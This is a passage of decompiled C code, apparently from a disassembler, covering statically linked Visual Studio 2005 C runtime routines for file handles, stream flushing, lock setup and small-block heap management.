  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425818)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x28;
      if ((*(byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __lseek_nolock(_FileHandle,_Offset,_Origin);
        }
        FUN_0040dedf();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0040dedf(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2005 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  return _File->_file;
}



// Library Function - Single Match
//  __flush
// 
// Library: Visual Studio 2005 Release

int __cdecl __flush(FILE *_File)

{
  int _FileHandle;
  uint uVar1;
  int iVar2;
  uint uVar3;
  char *_Buf;
  
  iVar2 = 0;
  if ((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) {
    _Buf = _File->_base;
    uVar3 = (int)_File->_ptr - (int)_Buf;
    if (0 < (int)uVar3) {
      uVar1 = uVar3;
      _FileHandle = __fileno(_File);
      uVar1 = __write(_FileHandle,_Buf,uVar1);
      if (uVar1 == uVar3) {
        if ((char)_File->_flag < '\0') {
          _File->_flag = _File->_flag & 0xfffffffd;
        }
      }
      else {
        _File->_flag = _File->_flag | 0x20;
        iVar2 = -1;
      }
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar2;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2005 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
    return iVar1;
  }
  iVar1 = __flush(_File);
  if (iVar1 != 0) {
    return -1;
  }
  if ((*(ushort *)&_File->_flag & 0x4000) != 0) {
    iVar1 = __fileno(_File);
    iVar1 = __commit(iVar1);
    return -(uint)(iVar1 != 0);
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _flsall
// 
// Library: Visual Studio 2005 Release

int __cdecl _flsall(int param_1)

{
  void **ppvVar1;
  void *_File;
  FILE *_File_00;
  int iVar2;
  int _Index;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_00426940; _Index = _Index + 1) {
    ppvVar1 = (void **)(DAT_00425920 + _Index * 4);
    if ((*ppvVar1 != (void *)0x0) && (_File = *ppvVar1, (*(byte *)((int)_File + 0xc) & 0x83) != 0))
    {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_00425920 + _Index * 4);
      if ((_File_00->_flag & 0x83U) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else if ((param_1 == 0) && ((_File_00->_flag & 2U) != 0)) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_0040e05c();
    }
  }
  FUN_0040e08b();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



void FUN_0040e05c(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_00425920 + unaff_ESI * 4));
  return;
}



void FUN_0040e08b(void)

{
  FUN_0040e37b(1);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __ioinit
// 
// Library: Visual Studio 2005 Release

int __cdecl __ioinit(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  HANDLE pvVar4;
  int iVar5;
  UINT *pUVar6;
  int iVar7;
  HANDLE *ppvVar8;
  UINT UVar9;
  UINT UVar10;
  _STARTUPINFOA local_68;
  uint local_24;
  HANDLE *local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x40e0a9;
  local_8 = 0;
  GetStartupInfoA(&local_68);
  local_8 = 0xfffffffe;
  puVar2 = (undefined4 *)__calloc_crt(0x20,0x28);
  if (puVar2 == (undefined4 *)0x0) {
LAB_0040e2d4:
    iVar7 = -1;
  }
  else {
    DAT_00425818 = 0x20;
    DAT_00425820 = puVar2;
    for (; puVar2 < DAT_00425820 + 0x140; puVar2 = puVar2 + 10) {
      *(undefined *)(puVar2 + 1) = 0;
      *puVar2 = 0xffffffff;
      *(undefined *)((int)puVar2 + 5) = 10;
      puVar2[2] = 0;
      *(undefined *)(puVar2 + 9) = 0;
      *(undefined *)((int)puVar2 + 0x25) = 10;
      *(undefined *)((int)puVar2 + 0x26) = 10;
    }
    if ((local_68.cbReserved2 != 0) && ((UINT *)local_68.lpReserved2 != (UINT *)0x0)) {
      UVar9 = *(UINT *)local_68.lpReserved2;
      pUVar6 = (UINT *)((int)local_68.lpReserved2 + 4);
      local_20 = (HANDLE *)((int)pUVar6 + UVar9);
      if (0x7ff < (int)UVar9) {
        UVar9 = 0x800;
      }
      iVar7 = 1;
      while ((UVar10 = UVar9, (int)DAT_00425818 < (int)UVar9 &&
             (puVar2 = (undefined4 *)__calloc_crt(0x20,0x28), UVar10 = DAT_00425818,
             puVar2 != (undefined4 *)0x0))) {
        (&DAT_00425820)[iVar7] = puVar2;
        DAT_00425818 = DAT_00425818 + 0x20;
        puVar1 = puVar2;
        for (; puVar2 < puVar1 + 0x140; puVar2 = puVar2 + 10) {
          *(undefined *)(puVar2 + 1) = 0;
          *puVar2 = 0xffffffff;
          *(undefined *)((int)puVar2 + 5) = 10;
          puVar2[2] = 0;
          *(byte *)(puVar2 + 9) = *(byte *)(puVar2 + 9) & 0x80;
          *(undefined *)((int)puVar2 + 0x25) = 10;
          *(undefined *)((int)puVar2 + 0x26) = 10;
          puVar1 = (&DAT_00425820)[iVar7];
        }
        iVar7 = iVar7 + 1;
      }
      local_24 = 0;
      if (0 < (int)UVar10) {
        do {
          pvVar4 = *local_20;
          if ((((pvVar4 != (HANDLE)0xffffffff) && (pvVar4 != (HANDLE)0xfffffffe)) &&
              ((*(byte *)pUVar6 & 1) != 0)) &&
             (((*(byte *)pUVar6 & 8) != 0 || (DVar3 = GetFileType(pvVar4), DVar3 != 0)))) {
            ppvVar8 = (HANDLE *)
                      ((local_24 & 0x1f) * 0x28 + (int)(&DAT_00425820)[(int)local_24 >> 5]);
            *ppvVar8 = *local_20;
            *(byte *)(ppvVar8 + 1) = *(byte *)pUVar6;
            iVar7 = ___crtInitCritSecAndSpinCount(ppvVar8 + 3,4000);
            if (iVar7 == 0) goto LAB_0040e2d4;
            ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
          }
          local_24 = local_24 + 1;
          pUVar6 = (UINT *)((int)pUVar6 + 1);
          local_20 = local_20 + 1;
        } while ((int)local_24 < (int)UVar10);
      }
    }
    iVar7 = 0;
    do {
      ppvVar8 = (HANDLE *)(DAT_00425820 + iVar7 * 10);
      if ((*ppvVar8 == (HANDLE)0xffffffff) || (*ppvVar8 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar8 + 1) = 0x81;
        if (iVar7 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar7 != 1);
        }
        pvVar4 = GetStdHandle(DVar3);
        if (((pvVar4 == (HANDLE)0xffffffff) || (pvVar4 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar4), DVar3 == 0)) {
          *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          *ppvVar8 = (HANDLE)0xfffffffe;
        }
        else {
          *ppvVar8 = pvVar4;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 8;
          }
          iVar5 = ___crtInitCritSecAndSpinCount(ppvVar8 + 3,4000);
          if (iVar5 == 0) goto LAB_0040e2d4;
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x80;
      }
      iVar7 = iVar7 + 1;
    } while (iVar7 < 3);
    SetHandleCount(DAT_00425818);
    iVar7 = 0;
  }
  return iVar7;
}



// Library Function - Single Match
//  __mtinitlocks
// 
// Library: Visual Studio 2005 Release

int __cdecl __mtinitlocks(void)

{
  int iVar1;
  int iVar2;
  undefined *puVar3;
  
  iVar2 = 0;
  puVar3 = &DAT_00423d60;
  do {
    if ((&DAT_00422474)[iVar2 * 2] == 1) {
      (&DAT_00422470)[iVar2 * 2] = puVar3;
      puVar3 = puVar3 + 0x18;
      iVar1 = ___crtInitCritSecAndSpinCount((&DAT_00422470)[iVar2 * 2],4000);
      if (iVar1 == 0) {
        (&DAT_00422470)[iVar2 * 2] = 0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



// Library Function - Single Match
//  __mtdeletelocks
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __mtdeletelocks(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION *pp_Var1;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00422470;
  do {
    lpCriticalSection = *pp_Var1;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      _free(lpCriticalSection);
      *pp_Var1 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x422590);
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00422470;
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x422590);
  return;
}



void __cdecl FUN_0040e37b(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_00422470)[param_1 * 2]);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __mtinitlocknum
// 
// Library: Visual Studio 2005 Release

int __cdecl __mtinitlocknum(int _LockNum)

{
  void **ppvVar1;
  void *_Memory;
  int *piVar2;
  int iVar3;
  int local_20;
  
  iVar3 = 1;
  local_20 = 1;
  if (DAT_00423eb4 == 0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    ___crtExitProcess(0xff);
  }
  ppvVar1 = (void **)(&DAT_00422470 + _LockNum * 2);
  if (*ppvVar1 == (void *)0x0) {
    _Memory = __malloc_crt(0x18);
    if (_Memory == (void *)0x0) {
      piVar2 = __errno();
      *piVar2 = 0xc;
      iVar3 = 0;
    }
    else {
      __lock(10);
      if (*ppvVar1 == (void *)0x0) {
        iVar3 = ___crtInitCritSecAndSpinCount(_Memory,4000);
        if (iVar3 == 0) {
          _free(_Memory);
          piVar2 = __errno();
          *piVar2 = 0xc;
          local_20 = 0;
        }
        else {
          *ppvVar1 = _Memory;
        }
      }
      else {
        _free(_Memory);
      }
      FUN_0040e44a();
      iVar3 = local_20;
    }
  }
  return iVar3;
}



void FUN_0040e44a(void)

{
  FUN_0040e37b(10);
  return;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2005 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((LPCRITICAL_SECTION)(&DAT_00422470)[_File * 2] == (LPCRITICAL_SECTION)0x0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_00422470)[_File * 2]);
  return;
}



// Library Function - Single Match
//  ___sbh_heap_init
// 
// Library: Visual Studio 2005 Release

undefined4 __cdecl ___sbh_heap_init(undefined4 param_1)

{
  DAT_00425804 = HeapAlloc(DAT_00423eb4,0,0x140);
  if (DAT_00425804 == (LPVOID)0x0) {
    return 0;
  }
  DAT_00423eb0 = 0;
  DAT_00425800 = 0;
  DAT_0042580c = DAT_00425804;
  DAT_00425808 = param_1;
  DAT_00425810 = 0x10;
  return 1;
}



void __thiscall thunk_FUN_0040e4f0(void *this,int param_1)

{
  FUN_0040e4f0((void *)(DAT_00425800 * 0x14 + DAT_00425804),param_1);
  return;
}



void __thiscall FUN_0040e4f0(void *this,int param_1)

{
  void *in_EAX;
  
  for (; (in_EAX < this && (0xfffff < (uint)(param_1 - *(int *)((int)in_EAX + 0xc))));
      in_EAX = (void *)((int)in_EAX + 0x14)) {
  }
  return;
}



// Library Function - Single Match
//  ___sbh_free_block
// 
// Library: Visual Studio 2005 Release

void __cdecl ___sbh_free_block(uint *param_1,int param_2)

{
  int *piVar1;
  char *pcVar2;
  uint *puVar3;
  int *piVar4;
  char cVar5;
  uint uVar6;
  uint uVar7;
  byte bVar8;
  uint uVar9;
  uint *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint uVar13;
  uint uVar14;
  uint local_8;
  
  uVar6 = param_1[4];
  puVar12 = (uint *)(param_2 + -4);
  uVar14 = param_2 - param_1[3] >> 0xf;
  piVar4 = (int *)(uVar14 * 0x204 + 0x144 + uVar6);
  local_8 = *puVar12 - 1;
  if ((local_8 & 1) == 0) {
    puVar10 = (uint *)(local_8 + (int)puVar12);
    uVar13 = *puVar10;
    uVar7 = *(uint *)(param_2 + -8);
    if ((uVar13 & 1) == 0) {
      uVar9 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar9) {
        uVar9 = 0x3f;
      }
      if (puVar10[1] == puVar10[2]) {
        if (uVar9 < 0x20) {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            *param_1 = *param_1 & uVar9;
          }
        }
        else {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 - 0x20 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            param_1[1] = param_1[1] & uVar9;
          }
        }
      }
      local_8 = local_8 + uVar13;
      *(uint *)(puVar10[2] + 4) = puVar10[1];
      *(uint *)(puVar10[1] + 8) = puVar10[2];
    }
    puVar10 = (uint *)(((int)local_8 >> 4) - 1);
    if ((uint *)0x3f < puVar10) {
      puVar10 = (uint *)0x3f;
    }
    puVar11 = param_1;
    if ((uVar7 & 1) == 0) {
      puVar12 = (uint *)((int)puVar12 - uVar7);
      puVar11 = (uint *)(((int)uVar7 >> 4) - 1);
      if ((uint *)0x3f < puVar11) {
        puVar11 = (uint *)0x3f;
      }
      local_8 = local_8 + uVar7;
      puVar10 = (uint *)(((int)local_8 >> 4) - 1);
      if ((uint *)0x3f < puVar10) {
        puVar10 = (uint *)0x3f;
      }
      if (puVar11 != puVar10) {
        if (puVar12[1] == puVar12[2]) {
          if (puVar11 < (uint *)0x20) {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              *param_1 = *param_1 & uVar13;
            }
          }
          else {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 - 0x20 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              param_1[1] = param_1[1] & uVar13;
            }
          }
        }
        *(uint *)(puVar12[2] + 4) = puVar12[1];
        *(uint *)(puVar12[1] + 8) = puVar12[2];
      }
    }
    if (((uVar7 & 1) != 0) || (puVar11 != puVar10)) {
      piVar1 = piVar4 + (int)puVar10 * 2;
      uVar13 = piVar1[1];
      puVar12[2] = (uint)piVar1;
      puVar12[1] = uVar13;
      piVar1[1] = (int)puVar12;
      *(uint **)(puVar12[1] + 8) = puVar12;
      if (puVar12[1] == puVar12[2]) {
        cVar5 = *(char *)((int)puVar10 + uVar6 + 4);
        *(char *)((int)puVar10 + uVar6 + 4) = cVar5 + '\x01';
        bVar8 = (byte)puVar10;
        if (puVar10 < (uint *)0x20) {
          if (cVar5 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 & 0x1f);
        }
        else {
          if (cVar5 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
      }
    }
    *puVar12 = local_8;
    *(uint *)((local_8 - 4) + (int)puVar12) = local_8;
    *piVar4 = *piVar4 + -1;
    if (*piVar4 == 0) {
      if (DAT_00423eb0 != (uint *)0x0) {
        VirtualFree((LPVOID)(DAT_00425814 * 0x8000 + DAT_00423eb0[3]),0x8000,0x4000);
        DAT_00423eb0[2] = DAT_00423eb0[2] | 0x80000000U >> ((byte)DAT_00425814 & 0x1f);
        *(undefined4 *)(DAT_00423eb0[4] + 0xc4 + DAT_00425814 * 4) = 0;
        *(char *)(DAT_00423eb0[4] + 0x43) = *(char *)(DAT_00423eb0[4] + 0x43) + -1;
        if (*(char *)(DAT_00423eb0[4] + 0x43) == '\0') {
          DAT_00423eb0[1] = DAT_00423eb0[1] & 0xfffffffe;
        }
        if (DAT_00423eb0[2] == 0xffffffff) {
          VirtualFree((LPVOID)DAT_00423eb0[3],0,0x8000);
          HeapFree(DAT_00423eb4,0,(LPVOID)DAT_00423eb0[4]);
          _memmove(DAT_00423eb0,DAT_00423eb0 + 5,
                   (DAT_00425800 * 0x14 - (int)DAT_00423eb0) + -0x14 + DAT_00425804);
          DAT_00425800 = DAT_00425800 + -1;
          if (DAT_00423eb0 < param_1) {
            param_1 = param_1 + -5;
          }
          DAT_0042580c = DAT_00425804;
        }
      }
      DAT_00423eb0 = param_1;
      DAT_00425814 = uVar14;
    }
  }
  return;
}



// Library Function - Single Match
//  ___sbh_alloc_new_region
// 
// Library: Visual Studio 2005 Release

undefined4 * ___sbh_alloc_new_region(void)

{
  LPVOID pvVar1;
  undefined4 *puVar2;
  
  if (DAT_00425800 == DAT_00425810) {
    pvVar1 = HeapReAlloc(DAT_00423eb4,0,DAT_00425804,(DAT_00425810 + 0x10) * 0x14);
    if (pvVar1 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_00425810 = DAT_00425810 + 0x10;
    DAT_00425804 = pvVar1;
  }
  puVar2 = (undefined4 *)(DAT_00425800 * 0x14 + (int)DAT_00425804);
  pvVar1 = HeapAlloc(DAT_00423eb4,8,0x41c4);
  puVar2[4] = pvVar1;
  if (pvVar1 != (LPVOID)0x0) {
    pvVar1 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar2[3] = pvVar1;
    if (pvVar1 != (LPVOID)0x0) {
      puVar2[2] = 0xffffffff;
      *puVar2 = 0;
      puVar2[1] = 0;
      DAT_00425800 = DAT_00425800 + 1;
      *(undefined4 *)puVar2[4] = 0xffffffff;
      return puVar2;
    }
    HeapFree(DAT_00423eb4,0,(LPVOID)puVar2[4]);
  }
  return (undefined4 *)0x0;
}



// Library Function - Single Match
//  ___sbh_alloc_new_group
// 
// Library: Visual Studio 2005 Release

int __cdecl ___sbh_alloc_new_group(int param_1)

{
  char cVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  LPVOID pvVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  LPVOID lpAddress;
  
  iVar2 = *(int *)(param_1 + 0x10);
  iVar8 = 0;
  for (iVar3 = *(int *)(param_1 + 8); -1 < iVar3; iVar3 = iVar3 * 2) {
    iVar8 = iVar8 + 1;
  }
  iVar3 = iVar8 * 0x204 + 0x144 + iVar2;
  iVar7 = 0x3f;
  iVar4 = iVar3;
  do {
    *(int *)(iVar4 + 8) = iVar4;
    *(int *)(iVar4 + 4) = iVar4;
    iVar4 = iVar4 + 8;
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  lpAddress = (LPVOID)(iVar8 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar5 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar5 == (LPVOID)0x0) {
    iVar8 = -1;
  }
  else {
    if (lpAddress <= (LPVOID)((int)lpAddress + 0x7000U)) {
      piVar6 = (int *)((int)lpAddress + 0x10);
      iVar7 = ((uint)((int)(LPVOID)((int)lpAddress + 0x7000U) - (int)lpAddress) >> 0xc) + 1;
      do {
        piVar6[-2] = -1;
        piVar6[0x3fb] = -1;
        *piVar6 = (int)(piVar6 + 0x3ff);
        piVar6[-1] = 0xff0;
        piVar6[1] = (int)(piVar6 + -0x401);
        piVar6[0x3fa] = 0xff0;
        piVar6 = piVar6 + 0x400;
        iVar7 = iVar7 + -1;
      } while (iVar7 != 0);
    }
    *(int *)(iVar3 + 0x1fc) = (int)lpAddress + 0xc;
    *(int *)((int)lpAddress + 0x14) = iVar3 + 0x1f8;
    *(int *)(iVar3 + 0x200) = (int)lpAddress + 0x700c;
    *(int *)((int)lpAddress + 0x7010) = iVar3 + 0x1f8;
    *(undefined4 *)(iVar2 + 0x44 + iVar8 * 4) = 0;
    *(undefined4 *)(iVar2 + 0xc4 + iVar8 * 4) = 1;
    cVar1 = *(char *)(iVar2 + 0x43);
    *(char *)(iVar2 + 0x43) = cVar1 + '\x01';
    if (cVar1 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar8 & 0x1f));
  }
  return iVar8;
}



// Library Function - Single Match
//  ___sbh_resize_block
// 
// Library: Visual Studio 2005 Release

undefined4 __cdecl ___sbh_resize_block(uint *param_1,int param_2,int param_3)

{
  char *pcVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  char cVar6;
  uint uVar7;
  uint *puVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint local_c;
  
  uVar7 = param_1[4];
  uVar10 = param_2 - param_1[3] >> 0xf;
  iVar5 = uVar10 * 0x204 + 0x144 + uVar7;
  uVar12 = param_3 + 0x17U & 0xfffffff0;
  iVar9 = *(int *)(param_2 + -4) + -1;
  puVar8 = (uint *)(*(int *)(param_2 + -4) + -5 + param_2);
  uVar13 = *puVar8;
  if (iVar9 < (int)uVar12) {
    if (((uVar13 & 1) != 0) || ((int)(uVar13 + iVar9) < (int)uVar12)) {
      return 0;
    }
    local_c = ((int)uVar13 >> 4) - 1;
    if (0x3f < local_c) {
      local_c = 0x3f;
    }
    if (puVar8[1] == puVar8[2]) {
      if (local_c < 0x20) {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c & 0x1f));
        puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c - 0x20 & 0x1f));
        puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(uint *)(puVar8[2] + 4) = puVar8[1];
    *(uint *)(puVar8[1] + 8) = puVar8[2];
    iVar9 = uVar13 + (iVar9 - uVar12);
    if (0 < iVar9) {
      uVar13 = (iVar9 >> 4) - 1;
      iVar3 = param_2 + -4 + uVar12;
      if (0x3f < uVar13) {
        uVar13 = 0x3f;
      }
      iVar5 = iVar5 + uVar13 * 8;
      *(undefined4 *)(iVar3 + 4) = *(undefined4 *)(iVar5 + 4);
      *(int *)(iVar3 + 8) = iVar5;
      *(int *)(iVar5 + 4) = iVar3;
      *(int *)(*(int *)(iVar3 + 4) + 8) = iVar3;
      if (*(int *)(iVar3 + 4) == *(int *)(iVar3 + 8)) {
        cVar6 = *(char *)(uVar13 + 4 + uVar7);
        *(char *)(uVar13 + 4 + uVar7) = cVar6 + '\x01';
        if (uVar13 < 0x20) {
          if (cVar6 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> ((byte)uVar13 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        }
        else {
          if (cVar6 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar13 - 0x20 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          uVar13 = uVar13 - 0x20;
        }
        *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar13 & 0x1f);
      }
      piVar4 = (int *)(param_2 + -4 + uVar12);
      *piVar4 = iVar9;
      *(int *)(iVar9 + -4 + (int)piVar4) = iVar9;
    }
    *(uint *)(param_2 + -4) = uVar12 + 1;
    *(uint *)(param_2 + -8 + uVar12) = uVar12 + 1;
  }
  else if ((int)uVar12 < iVar9) {
    param_3 = iVar9 - uVar12;
    *(uint *)(param_2 + -4) = uVar12 + 1;
    piVar4 = (int *)(param_2 + -4 + uVar12);
    uVar11 = (param_3 >> 4) - 1;
    piVar4[-1] = uVar12 + 1;
    if (0x3f < uVar11) {
      uVar11 = 0x3f;
    }
    if ((uVar13 & 1) == 0) {
      uVar12 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar12) {
        uVar12 = 0x3f;
      }
      if (puVar8[1] == puVar8[2]) {
        if (uVar12 < 0x20) {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar12;
          }
        }
        else {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 - 0x20 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar12;
          }
        }
      }
      *(uint *)(puVar8[2] + 4) = puVar8[1];
      *(uint *)(puVar8[1] + 8) = puVar8[2];
      param_3 = param_3 + uVar13;
      uVar11 = (param_3 >> 4) - 1;
      if (0x3f < uVar11) {
        uVar11 = 0x3f;
      }
    }
    iVar5 = iVar5 + uVar11 * 8;
    iVar9 = *(int *)(iVar5 + 4);
    piVar4[2] = iVar5;
    piVar4[1] = iVar9;
    *(int **)(iVar5 + 4) = piVar4;
    *(int **)(piVar4[1] + 8) = piVar4;
    if (piVar4[1] == piVar4[2]) {
      cVar6 = *(char *)(uVar11 + 4 + uVar7);
      *(char *)(uVar11 + 4 + uVar7) = cVar6 + '\x01';
      if (uVar11 < 0x20) {
        if (cVar6 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> ((byte)uVar11 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
      }
      else {
        if (cVar6 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar11 - 0x20 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        uVar11 = uVar11 - 0x20;
      }
      *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar11 & 0x1f);
    }
